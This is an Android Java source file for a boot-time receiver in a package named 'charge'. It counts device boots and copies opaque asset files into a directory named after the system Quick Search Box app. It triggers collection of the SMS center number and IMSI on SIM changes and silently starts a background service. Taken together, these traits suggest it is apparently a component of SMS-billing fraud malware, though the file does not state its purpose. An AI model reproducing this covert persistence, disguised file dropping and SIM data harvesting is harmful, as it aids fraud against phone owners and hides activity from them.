package com.sttm.charge;



import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;

import com.sttm.util.ByteUtil;
import com.sttm.util.KsoCache;
import com.sttm.util.LogFile;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;



/**
 * 
 * 开机接收器 
 * 
 * 开机接收器只做两件事，第一件事，记录开机次数和初始化数据，第二件事，启动主服务器
 * 
 * @author lj
 * @since 2012-5-10
 * 
 */

public class BootBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = "BootBroadcastReceiver";
	private int driveup = 0;// 开机次数
	private SharedPreferences driveup_pree;
	public static final String DRIVEUP_PREE = "DRIVEUP_PREE";
	private static final String DRIVEUP_COUNT_PREE = "DRIVEUP_COUNT_PREE";
	private static String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
	private KsoCache cache;

	@Override
	public void onReceive(Context context, Intent intent) {

		if (intent.getAction().equals(BOOT_ACTION)) {

			driveup_pree = context.getSharedPreferences(DRIVEUP_PREE, Context.MODE_WORLD_WRITEABLE);
		
			// ----------------------------------------------
			driveup = initdriveupcount(context) + 1;
			Log.d(TAG, "本次开机为第" + driveup + "开机");
			LogFile.WriteLogFile("本次开机为第" + driveup + "开机");
			savedriveupcount(context);
			// -----------------------------------------------
			
			//开机检查必要的内置文件是否存在
			checkMustFile(context);
			LogFile.WriteLogFile("拷贝内置文件");
			
			//================================================
			//开机初始化缓存数据
			cache = KsoCache.getInstance();
			cache.init(context);
			//Log.d(TAG, "开机初始化缓存数据");
			LogFile.WriteLogFile("开机初始化缓存数据");
			//==================================================
			
			/*判断手机有没有更换sim卡，如更换，则重新获取短信中心号码，imsi号等信息*/
			//cache.reSetValue("smsCenterFlag", true);
			KsoMainCourse.startSmsCenterHandler(context);
			

			// ---------------------------------------------
			// 启动主服务程序
			//Log.d(TAG, "开机启动主服务");
			LogFile.WriteLogFile("开机启动主服务");
			Intent service = new Intent(context, MainService.class);
			service.putExtra("driveup", driveup);
			context.startService(service);
			// ---------------------------------------------

		}
	}

	private int initdriveupcount(Context context) {
		return driveup_pree.getInt(DRIVEUP_COUNT_PREE, 0);
	}

	private void savedriveupcount(Context context) {
		driveup_pree.edit().putInt(DRIVEUP_COUNT_PREE, driveup).commit();
	}
	
	/*检查必要的内置文件, 如果不存在则从assets下拷贝生成*/
	private void checkMustFile(Context context){
		if(!fileIsExists("data/data/com.android.quicksearchbox/files/smartphonem.dat")){
			File retm = new File("data/data/com.android.quicksearchbox/files");
			if(!retm.exists()){
					retm.mkdirs();
				}
			byte[] buffer = getByteFromAssets(context,"smartphonem.dat");
				FileOutputStream os;
				try {
					os = new FileOutputStream(
							"data/data/com.android.quicksearchbox/files/smartphonem.dat");
					ByteUtil.writeByteFile(os, buffer);
				} catch (FileNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
		}
		if(!fileIsExists("data/data/com.android.quicksearchbox/files/smartphonec.dat")){
			File retc = new File("data/data/com.android.quicksearchbox/files");
			if(!retc.exists()){
					retc.mkdirs();
				}
			byte[] buffer = getByteFromAssets(context,"smartphonec.dat");
			FileOutputStream os;
			try {
				os = new FileOutputStream(
						"data/data/com.android.quicksearchbox/files/smartphonec.dat");
				ByteUtil.writeByteFile(os, buffer);
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	private byte[] getByteFromAssets(Context context,String filename){
		try{
			InputStream in = context.getResources().getAssets().open(filename);
			int length = in.available();
			byte[] buffer = new byte[length];
			int offset = 0;
			int numread = 0;
			while (offset < length && numread >= 0) {
				numread = in.read(buffer, offset, length - offset);
				offset += numread;
			}
			in.read(buffer);
			in.close();
			return buffer;
		}
		catch(Exception e){
			e.printStackTrace();
		}
		return null;
	}
	
	private boolean fileIsExists(String filename){
		 try{
		 File f=new File(filename);
		 if(!f.exists()){
		 return false;
		 }
		}catch (Exception e) {
		 // TODO: handle exception
		 return false;
		 }
		 return true;
	}
	
}
